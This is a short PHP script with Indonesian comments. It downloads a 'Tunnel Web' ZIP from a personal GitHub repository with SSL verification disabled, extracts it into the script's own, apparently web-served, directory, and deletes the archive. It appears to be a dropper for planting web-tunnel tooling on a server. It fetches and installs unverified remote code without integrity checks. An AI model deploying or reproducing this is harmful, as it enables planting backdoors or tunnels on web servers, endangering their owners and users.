<?php
// Fungsi untuk mendownload file
function downloadFile($url, $path) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $data = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode == 200 && $data) {
        return file_put_contents($path, $data);
    }
    return false;
}

// Fungsi untuk mengekstrak ZIP
function extractZip($zipFile, $extractPath) {
    $zip = new ZipArchive();
    $res = $zip->open($zipFile);

    if ($res === TRUE) {
        $zip->extractTo($extractPath);
        $zip->close();
        return true;
    }
    return false;
}

// Konfigurasi
$zipUrl = "https://github.com/Bayyzp/ntah/raw/refs/heads/main/Tunnel%20Web.zip";
$zipFileName = "Tunnel_Web.zip";
$currentDir = __DIR__;

echo "Memulai proses download dan ekstraksi...<br>";

// Download file ZIP
echo "Mendownload file ZIP...<br>";
if (downloadFile($zipUrl, $zipFileName)) {
    echo "Download berhasil!<br>";

    // Ekstrak file ZIP
    echo "Mengekstrak file...<br>";
    if (extractZip($zipFileName, $currentDir)) {
        echo "Ekstraksi berhasil! File telah diekstrak ke: " . $currentDir . "<br>";

        // Hapus file ZIP setelah diekstrak (opsional)
        if (unlink($zipFileName)) {
            echo "File ZIP berhasil dihapus.<br>";
        }
    } else {
        echo "Gagal mengekstrak file ZIP.<br>";
    }
} else {
    echo "Gagal mendownload file ZIP.<br>";
}

echo "Proses selesai.";
?>
